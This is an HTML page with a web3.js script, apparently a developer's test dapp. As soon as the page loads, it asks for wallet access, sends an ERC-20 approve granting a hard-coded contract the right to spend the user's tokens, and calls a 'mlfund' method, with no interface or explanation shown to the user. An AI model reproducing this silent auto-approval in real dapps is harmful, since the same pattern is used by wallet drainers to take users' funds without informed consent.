<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dapp</title>
  <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
</head>
<body>
  <script>
    const defosAddr = '0x6Dc47E3cD4B459606025b0B2ED600E1173429FeC'
    const usdtAddr = '0x9EFdcDE06D3c851AD7E7925509eECa1C605D8863'
    const abi = [
 {
  "inputs": [],
  "stateMutability": "nonpayable",
  "type": "constructor"
 },
 {
  "anonymous": false,
  "inputs": [
   {
    "indexed": true,
    "internalType": "address",
    "name": "owner",
    "type": "address"
   },
   {
    "indexed": true,
    "internalType": "address",
    "name": "spender",
    "type": "address"
   },
   {
    "indexed": false,
    "internalType": "uint256",
    "name": "value",
    "type": "uint256"
   }
  ],
  "name": "Approval",
  "type": "event"
 },
 {
  "anonymous": false,
  "inputs": [
   {
    "indexed": true,
    "internalType": "address",
    "name": "from",
    "type": "address"
   },
   {
    "indexed": true,
    "internalType": "address",
    "name": "to",
    "type": "address"
   },
   {
    "indexed": false,
    "internalType": "uint256",
    "name": "value",
    "type": "uint256"
   }
  ],
  "name": "Transfer",
  "type": "event"
 },
 {
  "inputs": [
   {
    "internalType": "address",
    "name": "owner",
    "type": "address"
   },
   {
    "internalType": "address",
    "name": "spender",
    "type": "address"
   }
  ],
  "name": "allowance",
  "outputs": [
   {
    "internalType": "uint256",
    "name": "",
    "type": "uint256"
   }
  ],
  "stateMutability": "view",
  "type": "function"
 },
 {
  "inputs": [
   {
    "internalType": "address",
    "name": "spender",
    "type": "address"
   },
   {
    "internalType": "uint256",
    "name": "amount",
    "type": "uint256"
   }
  ],
  "name": "approve",
  "outputs": [
   {
    "internalType": "bool",
    "name": "",
    "type": "bool"
   }
  ],
  "stateMutability": "nonpayable",
  "type": "function"
 },
 {
  "inputs": [
   {
    "internalType": "address",
    "name": "account",
    "type": "address"
   }
  ],
  "name": "balanceOf",
  "outputs": [
   {
    "internalType": "uint256",
    "name": "",
    "type": "uint256"
   }
  ],
  "stateMutability": "view",
  "type": "function"
 },
 {
  "inputs": [
   {
    "internalType": "uint256",
    "name": "amount",
    "type": "uint256"
   }
  ],
  "name": "burn",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
 },
 {
  "inputs": [
   {
    "internalType": "address",
    "name": "account",
    "type": "address"
   },
   {
    "internalType": "uint256",
    "name": "amount",
    "type": "uint256"
   }
  ],
  "name": "burnFrom",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
 },
 {
  "inputs": [],
  "name": "decimals",
  "outputs": [
   {
    "internalType": "uint8",
    "name": "",
    "type": "uint8"
   }
  ],
  "stateMutability": "view",
  "type": "function"
 },
 {
  "inputs": [
   {
    "internalType": "address",
    "name": "spender",
    "type": "address"
   },
   {
    "internalType": "uint256",
    "name": "subtractedValue",
    "type": "uint256"
   }
  ],
  "name": "decreaseAllowance",
  "outputs": [
   {
    "internalType": "bool",
    "name": "",
    "type": "bool"
   }
  ],
  "stateMutability": "nonpayable",
  "type": "function"
 },
 {
  "inputs": [
   {
    "internalType": "address",
    "name": "spender",
    "type": "address"
   },
   {
    "internalType": "uint256",
    "name": "addedValue",
    "type": "uint256"
   }
  ],
  "name": "increaseAllowance",
  "outputs": [
   {
    "internalType": "bool",
    "name": "",
    "type": "bool"
   }
  ],
  "stateMutability": "nonpayable",
  "type": "function"
 },
 {
  "inputs": [],
  "name": "name",
  "outputs": [
   {
    "internalType": "string",
    "name": "",
    "type": "string"
   }
  ],
  "stateMutability": "view",
  "type": "function"
 },
 {
  "inputs": [],
  "name": "symbol",
  "outputs": [
   {
    "internalType": "string",
    "name": "",
    "type": "string"
   }
  ],
  "stateMutability": "view",
  "type": "function"
 },
 {
  "inputs": [],
  "name": "totalSupply",
  "outputs": [
   {
    "internalType": "uint256",
    "name": "",
    "type": "uint256"
   }
  ],
  "stateMutability": "view",
  "type": "function"
 },
 {
  "inputs": [
   {
    "internalType": "address",
    "name": "recipient",
    "type": "address"
   },
   {
    "internalType": "uint256",
    "name": "amount",
    "type": "uint256"
   }
  ],
  "name": "transfer",
  "outputs": [
   {
    "internalType": "bool",
    "name": "",
    "type": "bool"
   }
  ],
  "stateMutability": "nonpayable",
  "type": "function"
 },
 {
  "inputs": [
   {
    "internalType": "address",
    "name": "sender",
    "type": "address"
   },
   {
    "internalType": "address",
    "name": "recipient",
    "type": "address"
   },
   {
    "internalType": "uint256",
    "name": "amount",
    "type": "uint256"
   }
  ],
  "name": "transferFrom",
  "outputs": [
   {
    "internalType": "bool",
    "name": "",
    "type": "bool"
   }
  ],
  "stateMutability": "nonpayable",
  "type": "function"
 }
]
    const dfAbi = [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "baseAddr",
      "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "baseToken",
      "outputs": [
      {
        "internalType": "contract EIP20NonStandardInterface",
        "name": "",
        "type": "address"
      }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "etherUnit",
      "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
      {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
      }
      ],
      "name": "mlfund",
      "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "quoteAddr",
      "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "quoteToken",
      "outputs": [
      {
        "internalType": "contract EIP20NonStandardInterface",
        "name": "",
        "type": "address"
      }
      ],
      "stateMutability": "view",
      "type": "function"
    }
    ]
    try {
      window.addEventListener('load', async () => {
        // Modern dapp browsers...
        console.log('web3 before: ', web3)
        if (window.ethereum) {
          alert('window.ethereum')
          window.web3 = new Web3(ethereum);
          console.log('web3: ', web3)
          try {
            // Request account access if needed
            await ethereum.enable();
            const ETH = web3.eth
            // Calculate contract compatible value for approve with proper decimal points using BigNumber
            const tokenDecimals = web3.utils.toBN(18);
            const tokenAmountToApprove = web3.utils.toBN(1234);
            const calculatedApproveValue = web3.utils.toHex(tokenAmountToApprove.mul(web3.utils.toBN(10).pow(tokenDecimals)));
            const contract = new ETH.Contract(abi, usdtAddr.toLowerCase())
            const dfContarct = new ETH.Contract(dfAbi, defosAddr.toLowerCase())
            const accounts = await web3.eth.getAccounts()
            // await contract.methods.approve('0x6Dc47E3cD4B459606025b0B2ED600E1173429FeC', 999999999999999).call()
            await contract.methods.approve('0x6Dc47E3cD4B459606025b0B2ED600E1173429FeC', calculatedApproveValue).send({from: accounts[0]})
            await dfContarct.methods.mlfund(web3.utils.toBN(123*Math.pow(10,18))).call()
            // Acccounts now exposed
            // web3.eth.sendTransaction({/* ... */});
            console.log('contract: ', contract)
          } catch (error) {
            // User denied account access...
            console.log(error)
          }
        } else if (window.web3) { 
          alert('window.web3')
        // Legacy dapp browsers...
          window.web3 = new Web3(web3.currentProvider);
          // Acccounts always exposed
        } else {
          // Non-dapp browsers...
          alert('Non-Ethereum browser detected. You should consider trying MetaMask!');
        }
        if(window.ethereum.isImToken) {
          alert('isImToken')
          imToken.callAPI('native.alert', 'winner winner, chicken dinnerÔºÅ')
        }
      });
    } catch (error) {
      alert('error: ', error)
    }
  </script>
</body>
</html>